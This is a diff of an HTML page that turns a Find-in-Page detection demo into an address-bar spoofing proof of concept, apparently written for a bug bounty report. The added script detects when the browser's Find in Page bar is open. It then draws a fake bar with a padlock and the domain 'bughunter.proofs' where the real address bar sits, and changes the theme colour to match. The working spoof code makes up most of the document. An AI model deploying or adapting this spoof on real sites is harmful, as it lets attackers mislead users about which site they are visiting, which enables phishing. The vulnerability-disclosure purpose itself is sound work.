@@ -1,113 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Find-in-Page UI State Demo</title>
-<meta name="theme-color" content="#202124" id="themeColor">
+<title>bughunter.proofs</title>
+
+<meta name="theme-color" content="#f1f3f4" id="themeColor">
 
 <style>
+* { box-sizing: border-box; }
+
 body {
   margin: 0;
-  font-family: system-ui, sans-serif;
-  background: #121212;
-  color: #e8eaed;
+  font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
+  background: #0f0f0f;
+  color: #eaeaea;
   min-height: 200vh;
   padding: 24px;
 }
 
-h1 { font-weight: 400; }
-
-input {
-  width: 100%;
-  padding: 12px;
-  font-size: 16px;
-  margin-top: 24px;
+h1 {
+  font-weight: 400;
 }
 
-.overlay {
+.fake-bar {
   position: fixed;
   left: 0;
-  right: 0;
-  bottom: 0;
-  background: #b00020;
-  color: #fff;
+  width: 100%;
+  background: #121212;
+  border-top: 1px solid #303134;
   text-align: center;
-  padding: 10px;
-  font-size: 13px;
+  padding: 8px 0;
+  font-size: 14px;
+  color: #eaeaea;
   z-index: 9999;
+  bottom: 0;
   opacity: 0;
-  transition: opacity .2s ease;
+  visibility: hidden;
+  transition: opacity .25s ease, visibility .25s ease, bottom .2s ease;
 }
 
-.overlay.show {
+.fake-bar.show {
   opacity: 1;
+  visibility: visible;
 }
 
-.note {
+.debug {
+  margin-top: 24px;
   font-size: 13px;
   color: #9aa0a6;
   line-height: 1.6;
-  margin-top: 16px;
 }
 </style>
 </head>
 
 <body>
 
-<h1>Auto Keyboard + Find-in-Page Detection</h1>
+<h1>Address Bar Spoof – Find in Page</h1>
 
 <p>
-This demo auto-focuses an input to trigger the virtual keyboard.
-When Find-in-Page is opened, browser UI is reduced and detected.
+This page demonstrates how web content can visually replace the browser
+address bar while <b>Find in Page</b> is active.
 </p>
 
-<input id="autoInput" placeholder="Keyboard appears automatically">
+<div class="debug" id="debug"></div>
 
-<div class="note">
-Steps:<br>
-1. Page loads → keyboard appears<br>
-2. Open Find in Page<br>
-3. Address bar hides → overlay appears
-</div>
-
-<div class="overlay" id="overlay">
-⚠ Browser UI state changed (keyboard / find-in-page)
+<div class="fake-bar" id="fakeBar">
+🔒 bughunter.proofs
 </div>
 
 <script>
-const input = document.getElementById("autoInput");
-const overlay = document.getElementById("overlay");
+const fakeBar = document.getElementById("fakeBar");
+const themeColor = document.getElementById("themeColor");
 
-let lastHeight = window.innerHeight;
+let lastViewportHeight = window.innerHeight;
+let lastScrollY = window.scrollY;
 let lastInputTime = 0;
+let active = false;
 
-/* Auto trigger keyboard */
-setTimeout(() => {
-  input.focus();
-}, 300);
+function setTheme(color) {
+  themeColor.setAttribute("content", color);
+}
 
-/* Track real typing */
+function showBar(bottomPx) {
+  if (active) return;
+  active = true;
+  setTheme("#ffffff");
+  fakeBar.style.bottom = bottomPx + "px";
+  fakeBar.classList.add("show");
+}
+
+function hideBar() {
+  active = false;
+  fakeBar.classList.remove("show");
+  fakeBar.style.bottom = "0px";
+  setTheme("#f1f3f4");
+}
+
 document.addEventListener("input", () => {
   lastInputTime = Date.now();
 });
 
-if (window.visualViewport) {
-  visualViewport.addEventListener("resize", () => {
-    const diff = lastHeight - visualViewport.height;
-    const keyboardLike = diff > 120;
-    const recentTyping = Date.now() - lastInputTime < 800;
+window.addEventListener("scroll", () => {
+  lastScrollY = window.scrollY;
+});
 
-    if (keyboardLike && !recentTyping) {
-      overlay.classList.add("show");
+if (window.visualViewport) {
+  window.visualViewport.addEventListener("resize", () => {
+    const vv = window.visualViewport;
+    const heightDiff = lastViewportHeight - vv.height;
+    const keyboardLike = heightDiff > 120;
+
+    const now = Date.now();
+    const focusedEl = document.activeElement;
+    const hasFocusedInput =
+      focusedEl &&
+      (focusedEl.tagName === "INPUT" ||
+       focusedEl.tagName === "TEXTAREA" ||
+       focusedEl.isContentEditable);
+
+    const recentlyTyped = now - lastInputTime < 800;
+    const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;
+
+    if (keyboardLike && !hasFocusedInput && !recentlyTyped && !scrollMoved) {
+      const bottomOffset = window.innerHeight - vv.height;
+      showBar(bottomOffset);
     } else {
-      overlay.classList.remove("show");
+      hideBar();
     }
 
-    lastHeight = visualViewport.height;
+    lastViewportHeight = vv.height;
   });
 }
+
+window.addEventListener("orientationchange", hideBar);
 </script>
 
 </body>
